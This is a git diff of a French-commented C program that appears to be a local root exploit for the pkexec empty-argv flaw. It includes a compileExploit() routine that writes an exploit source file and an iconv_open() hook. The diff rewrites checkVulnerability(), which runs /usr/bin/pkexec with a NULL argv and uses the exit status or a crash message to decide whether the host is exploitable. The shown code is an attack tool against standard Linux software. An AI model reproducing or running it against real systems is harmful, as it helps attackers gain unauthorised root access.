@@ -9,6 +9,7 @@
 
 struct stat st;
 int pipefd[2];
+
 char buf[99999];
 void compileExploit() {
   // Créer le fichier exploit/exploit.c et y écrire le programme en C qui tente
@@ -86,41 +87,35 @@ void iconv_open() {
 }
 
 void checkVulnerability() {
-  // Exécuter pkexec en passant NULL comme argv pour tenter d'accéder hors limite.
-  int pipefd[2];
-  pid_t pid;
-  char * a_argv[] = { NULL };
-  char * a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
-
-  if (pipe(pipefd) < 0) {
-    perror("pipe");
-    exit(0);
-  }
-
-  pid = fork();
-  if (pid == 0) {
-    // Dans le processus fils, fermer l'entrée du pipe et rediriger la sortie standard vers l'entrée du pipe.
-    close(pipefd[0]);
-    dup2(pipefd[1], 1);
-
-    // Exécuter pkexec en passant NULL comme argv.
-    execve("/usr/bin/pkexec", a_argv, a_envp);
-    exit(0);
-  } else if (pid > 0) {
-    // Dans le processus parent, fermer la sortie du pipe et lire la sortie standard du processus fils depuis l'entrée du pipe.
-    close(pipefd[1]);
-    read(pipefd[0], buf, sizeof(buf));
-
-    // Vérifier si la sortie standard contient une erreur d'accès hors limite.
-    if (strstr(buf, "segmentation fault") != NULL) {
-      // Si oui, la faille a été corrigée.
-      printf("Le système n'est pas vulnérable\n");
-      exit(0);
+    // Le processus principal (appelé le processus père) crée un nouveau processus enfant 
+    pid_t pid = fork();
+     
+    if ( pid == 0 ) {
+        execve("/usr/bin/pkexec", (char*[]){NULL}, NULL);
     }
-  } else {
-    perror("fork");
-    exit(0);
-  }
+ 
+    else {
+        int status;
+        waitpid(pid, &status, 0);
+
+        //  Lorsque le processus enfant s'est terminé, la fonction WIFEXITED() est utilisée pour vérifier si l'exécution s'est terminée
+        // normalement, et la fonction WEXITSTATUS() est utilisée pour obtenir le code de sortie du processus enfant. 
+        if ( WIFEXITED(status) )
+        {
+            int exit_status = WEXITSTATUS(status);
+
+            // Si le code de sortie est égal à 1, cela signifie que le système n'est pas vulnérable, 
+            if (exit_status == 1) {
+            	puts("Your system is not vulnerable");
+              exit(0);
+            }
+
+            // Sinon, cela signifie que le système est vulnérable, 
+            else {
+            	puts("Your system is vulnerable\n");
+            }
+        }
+    }
 }
 
 int main(int argc, char * argv[]) {
